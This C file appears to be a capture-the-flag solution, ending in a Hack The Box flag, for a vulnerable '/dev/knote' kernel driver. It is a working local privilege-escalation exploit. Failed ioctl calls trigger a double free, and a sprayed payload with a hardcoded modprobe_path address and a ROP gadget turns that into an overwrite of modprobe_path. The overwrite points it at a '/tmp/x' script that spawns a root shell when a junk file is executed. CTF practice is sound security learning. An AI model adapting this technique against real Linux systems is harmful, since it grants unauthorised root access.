#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>

typedef struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;

typedef struct knote_user {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};

int encrypt(unsigned long idx) {
    printf("Inside encrypt function\n");
}

int create(int f, unsigned long arg) {
    return ioctl(f, KNOTE_CREATE, (void*)arg);
}

void delete(int f, unsigned long arg) {
    ioctl(f, KNOTE_DELETE, (void*)arg);
}

int sandbox() {
    printf("Testing ioctl\n");
    // need to open the "file"?
    int knote_fd = open("/dev/knote", O_RDONLY);
    encrypt(1);
    
    knote_t payload;
    payload.data = "hello";
    payload.len = 8;
    /* payload.encrypt_func = NULL; */
    /* payload.decrypt_func = NULL; */

    knote_user_t to_send;
    to_send.idx = 1;
    /* to_send.data = (char*)&payload; */
    to_send.data = (char*)0x1337;
    to_send.len = 1;

    /* int err = ioctl(knote_fd, KNOTE_CREATE, (void*)&to_send); */
    // cause a failure on the first try
    // this fails the create operation
    // causes kfree() to execute on knotes[ku.idx]->data and ku.data
    int ret = create(knote_fd, (unsigned long)&to_send);
    printf("Return value: %d\n", ret);
    /* create(knote_fd, (unsigned long)&to_send); */
    /* delete(knote_fd, (unsigned long)&to_send); // delete a note  */
    /* printf("Finished testing ioctl %d\n", err); */
    
}

void do_shell() {
    system("echo '#!/bin/sh' > /tmp/x; echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x; chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' >> /tmp/dummy && chmod +x /tmp/dummy");
    system("/tmp/dummy");
    exit(0);
}

void trigger_modprobe() {
    system("echo '#!/bin/sh' > /tmp/x; echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    int ff = open("/tmp/ffff", O_WRONLY|O_CREAT);
    write(ff, "\xff\xff\xff\xff", 4);
    close(ff);
    system("chmod 777 /tmp/ffff; /tmp/ffff");
    system("sh");
}

int main() {
    int knote_fd = open("/dev/knote", O_RDONLY);

    // this is stuff that is properly structured
    // instead i need it to crash 
    // failed allocation, and also called free
    // double free should give me two writes on the slab 
    knote_user_t abc;
    abc.idx = 0;
    abc.data = 0x1337; // giving invalid memory address works
    abc.len = 0x20; // i think the length needs to be 0x20 because we are trying to put something on the slab allocator? not exactly sure 
    int abc_ret = ioctl(knote_fd, KNOTE_CREATE, (void*)&abc);
    printf("first copy: %d\n", abc_ret);

    /* int del_ret = ioctl(knote_fd, KNOTE_DELETE, (void*)&abc); */
    /* printf("Deleted %d\n", del_ret); */


    knote_user_t def;
    def.idx = 1;
    /* def.data = "BBBBDDDDEEEEFFFFBBBBDDDDEEEEFFFF"; // modify this data  */
    /* def.data = ""; // this data overwrites the first pointer */
    const size_t modprobepath = 0xffffffff81837bc0;
/* 0xffffffff810532f4: mov qword ptr [rdi], rsi; ret;  */
    const size_t mov_rdi_rsi = 0xffffffff810532f4;
    size_t payload[] = {
        modprobepath,
        *(size_t*)"/tmp/x",
        mov_rdi_rsi,
        NULL
    };
    def.data = (void*) payload;
    // this caused a reboot because I think we overwrote the encrypt() address?
    def.len = 0x20;

    knote_user_t temp1;
    temp1.idx = 0;
    temp1.data = "AAAABBBBAAAABBBBAAAABBBBAAAABBBB";
    temp1.len = 0x20;
    /**/
    /* int temp2 = ioctl(knote_fd, KNOTE_CREATE, (void*)&temp1); */
    int def_ret = ioctl(knote_fd, KNOTE_CREATE, (void*)&def);
    printf("second copy: %d\n", def_ret);

    int enc_ret = ioctl(knote_fd, KNOTE_ENCRYPT, (void*)&abc);
    printf("%d\n", enc_ret);

    /* trigger_modprobe(); */
    do_shell();
}


// flag: HTB{2cdbf36398470b5428ea991d18502ef2}


